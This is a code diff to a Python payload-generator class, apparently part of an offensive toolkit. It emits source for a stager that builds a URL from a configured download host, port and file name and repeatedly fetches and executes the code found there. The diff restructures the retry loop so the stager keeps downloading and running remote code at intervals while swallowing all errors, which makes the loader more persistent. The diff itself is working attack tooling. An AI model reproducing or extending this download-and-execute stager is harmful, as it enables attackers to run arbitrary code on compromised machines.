@@ -76,11 +76,15 @@ class Payload:
 		main += "\n\t%s = 'http://%s:%s/%s'" % (url_var, self.required_options['DownloadHost'][0], self.required_options['DownloadPort'][0], self.required_options['DownloadName'][0])
 		main += "\n\ttry:"
 		main += "\n\t\t%s(%s)" % (getexec_func, url_var)
-		main += "\n\t\twhile %s is True:" % retry_var
-		main += "\n\t\t\ttime.sleep(%s)" % interval_var
-		main += "\n\t\t\t%s(%s)" % (getexec_func, url_var)
 		main += "\n\texcept Exception:"
 		main += "\n\t\tpass"
+
+		main += "\n\twhile %s is True:" % retry_var
+		main += "\n\t\ttry:"
+		main += "\n\t\t\t%s(%s)" % (getexec_func, url_var)
+		main += "\n\t\t\ttime.sleep(%s)" % interval_var
+		main += "\n\t\texcept Exception:"
+		main += "\n\t\t\tpass"
 		main += "\nif __name__ == '__main__':"
 		main += "\n\t%s()" % main_func
 
